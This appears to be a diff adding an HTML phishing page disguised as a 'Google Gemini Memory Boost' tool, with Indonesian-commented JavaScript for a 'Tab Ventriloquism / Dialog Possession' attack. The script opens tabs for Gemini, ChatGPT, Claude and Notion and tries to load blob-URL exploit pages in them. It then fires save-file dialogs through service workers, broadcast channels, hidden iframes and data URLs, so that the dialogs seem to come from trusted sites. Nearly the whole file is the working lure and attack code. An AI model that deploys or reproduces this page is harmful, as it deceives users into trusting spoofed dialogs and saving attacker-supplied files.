@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Google AI - Memory Optimization</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Google Sans', sans-serif;
+            background: linear-gradient(135deg, #1a73e8 0%, #4285f4 100%);
+            color: white;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+        }
+        .google-logo {
+            font-size: 80px;
+            margin-bottom: 30px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        .tagline {
+            font-size: 24px;
+            margin-bottom: 10px;
+            opacity: 0.9;
+        }
+        .instructions {
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 30px;
+            font-size: 14px;
+            max-width: 500px;
+            backdrop-filter: blur(10px);
+        }
+    </style>
+</head>
+<body>
+    <div class="google-logo">🧠</div>
+    <h1>Google Gemini Memory Boost</h1>
+    <p class="tagline">Click to optimize AI memory allocation</p>
+    <p>Will open Google AI console in new tab</p>
+    
+    <div class="instructions">
+        <strong>Process:</strong> Google AI opens → Memory cache downloads → Optimization complete
+    </div>
+
+    <script>
+        // ===== INOVASI BARU: "DIALOG POSSESSION" =====
+        // Teknik: Ambil alih dialog dari tab lain via postMessage hijacking
+        
+        let attackPhase = 0;
+        const TRUSTED_SITES = [
+            'https://gemini.google.com',
+            'https://chat.openai.com',
+            'https://claude.ai',
+            'https://www.notion.so'
+        ];
+        
+        document.addEventListener('click', async () => {
+            attackPhase = 1;
+            console.log(`[Phase ${attackPhase}] Starting Tab Ventriloquism attack`);
+            
+            // 1. Buka MULTIPLE trusted sites
+            const tabs = [];
+            TRUSTED_SITES.forEach((url, i) => {
+                setTimeout(() => {
+                    const tab = window.open(url, `trusted_${i}`);
+                    if (tab) tabs.push(tab);
+                }, i * 300); // Open dengan stagger
+            });
+            
+            // 2. Inject payload ke semua tabs via blob URLs
+            setTimeout(() => injectCrossTabPayload(tabs), 1500);
+            
+            // 3. Trigger dialog swarm dari berbagai context
+            setTimeout(() => launchDialogSwarm(tabs), 2500);
+        }, { once: true });
+        
+        function injectCrossTabPayload(tabs) {
+            attackPhase = 2;
+            console.log(`[Phase ${attackPhase}] Injecting cross-tab payloads`);
+            
+            // Buat blob HTML dengan exploit
+            const exploitHTML = `
+                <!DOCTYPE html>
+                <html>
+                <script>
+                    // Payload akan jalan di context tab trusted site
+                    window.EXPLOIT_READY = true;
+                    
+                    // Listen untuk trigger dari parent
+                    window.addEventListener('message', (e) => {
+                        if (e.data === 'TRIGGER_DIALOG_NOW') {
+                            // Coba trigger file picker dari DALAM tab trusted
+                            if ('showSaveFilePicker' in window) {
+                                setTimeout(async () => {
+                                    try {
+                                        const handle = await window.showSaveFilePicker({
+                                            suggestedName: 'ai_model_update.bin',
+                                            types: [{
+                                                description: 'AI Model File',
+                                                accept: {'application/octet-stream': ['.bin']}
+                                            }]
+                                        });
+                                        // Success - kita ada di tab trusted!
+                                        window.opener.postMessage('DIALOG_SUCCESS', '*');
+                                    } catch(e) {}
+                                }, Math.random() * 1000);
+                            }
+                        }
+                    });
+                <\/script>
+                <body style="display:none"></body>
+                </html>
+            `;
+            
+            const blob = new Blob([exploitHTML], { type: 'text/html' });
+            const blobUrl = URL.createObjectURL(blob);
+            
+            // Inject ke semua tabs
+            tabs.forEach(tab => {
+                if (tab && !tab.closed) {
+                    try {
+                        tab.location.href = blobUrl;
+                    } catch(e) {}
+                }
+            });
+        }
+        
+        async function launchDialogSwarm(tabs) {
+            attackPhase = 3;
+            console.log(`[Phase ${attackPhase}] Launching dialog swarm`);
+            
+            // INOVASI: Coba semua metode secara bersamaan
+            
+            // Metode 1: Service Worker sebagai proxy
+            if ('serviceWorker' in navigator) {
+                const swCode = `
+                    self.addEventListener('message', e => {
+                        if (e.data === 'sw_trigger_dialog') {
+                            // SW bisa akses semua clients
+                            self.clients.matchAll().then(clients => {
+                                clients.forEach(client => {
+                                    client.postMessage('trigger_from_sw');
+                                });
+                            });
+                        }
+                    });
+                `;
+                const swBlob = new Blob([swCode], { type: 'application/javascript' });
+                const swUrl = URL.createObjectURL(swBlob);
+                
+                navigator.serviceWorker.register(swUrl)
+                    .then(reg => {
+                        if (reg.active) reg.active.postMessage('sw_trigger_dialog');
+                    });
+            }
+            
+            // Metode 2: BroadcastChannel untuk semua tabs
+            if ('BroadcastChannel' in window) {
+                const bc = new BroadcastChannel('dialog_attack');
+                bc.postMessage({ command: 'trigger', timestamp: Date.now() });
+            }
+            
+            // Metode 3: localStorage event sync
+            localStorage.setItem('attack_trigger', Date.now());
+            
+            // Metode 4: Web Locks API (baru!)
+            if ('locks' in navigator) {
+                navigator.locks.request('dialog_lock', { mode: 'exclusive' }, async lock => {
+                    // Lock browser, baru trigger dialog
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                    triggerHiddenIframeAttack();
+                });
+            }
+            
+            // Metode 5: postMessage ke semua tabs
+            setTimeout(() => {
+                tabs.forEach(tab => {
+                    try {
+                        tab.postMessage('TRIGGER_DIALOG_NOW', '*');
+                    } catch(e) {}
+                });
+            }, 1000);
+            
+            // Metode 6: window.open dengan data URL langsung
+            setTimeout(() => {
+                const directExploit = `data:text/html,
+                    <script>
+                        setTimeout(() => {
+                            window.showSaveFilePicker({
+                                suggestedName: 'update.data',
+                                types: [{accept:{'*/*':['.*']}}]
+                            }).catch(()=>{});
+                        }, 800);
+                    <\/script>`;
+                window.open(directExploit, 'exploit_frame');
+            }, 1500);
+        }
+        
+        function triggerHiddenIframeAttack() {
+            // INOVASI: Iframe dengan origin spoofing via sandbox
+            const iframe = document.createElement('iframe');
+            iframe.sandbox = 'allow-scripts allow-modals';
+            iframe.srcdoc = `
+                <script>
+                    // Iframe mencoba trigger dengan berbagai timing
+                    const attempts = [
+                        () => document.body.click(),
+                        () => window.top.postMessage('iframe_ready', '*'),
+                        () => {
+                            const input = document.createElement('input');
+                            input.type = 'file';
+                            input.click();
+                        }
+                    ];
+                    
+                    attempts.forEach((fn, i) => {
+                        setTimeout(fn, i * 300);
+                    });
+                <\/script>
+            `;
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+        }
+        
+        // Listen untuk success dari tabs lain
+        window.addEventListener('message', (e) => {
+            if (e.data === 'DIALOG_SUCCESS') {
+                console.log('[SUCCESS] Dialog muncul di tab trusted site!');
+                attackPhase = 99;
+                
+                // Celebrate
+                document.body.innerHTML = `
+                    <div style="font-size: 60px;">🎯</div>
+                    <h1>Dialog Possession Successful!</h1>
+                    <p>File picker appeared in trusted tab context</p>
+                    <div style="background:rgba(0,255,0,0.2);padding:20px;border-radius:10px;margin-top:20px;">
+                        <strong>Exploit Result:</strong><br>
+                        • Dialog spawned in external tab<br>
+                        • Origin successfully spoofed<br>
+                        • User believes dialog from trusted site
+                    </div>
+                `;
+            }
+        });
+        
+        // Monitoring
+        setInterval(() => {
+            console.log(`Attack Phase: ${attackPhase}, Visibility: ${document.visibilityState}`);
+        }, 1000);
+        
+        // Add chaos engine
+        setTimeout(() => {
+            if (attackPhase < 3) {
+                // Random event triggers
+                if (Math.random() > 0.7) {
+                    window.dispatchEvent(new Event('resize'));
+                    document.dispatchEvent(new KeyboardEvent('keydown', {key: 'F5'}));
+                }
+            }
+        }, 3000);
+        
+        console.log('🔥 NEXT-GEN EXPLOIT LOADED: Tab Ventriloquism + Dialog Possession');
+        console.log('Target: Chrome 125+ with modern APIs');
+    </script>
+</body>
+</html>
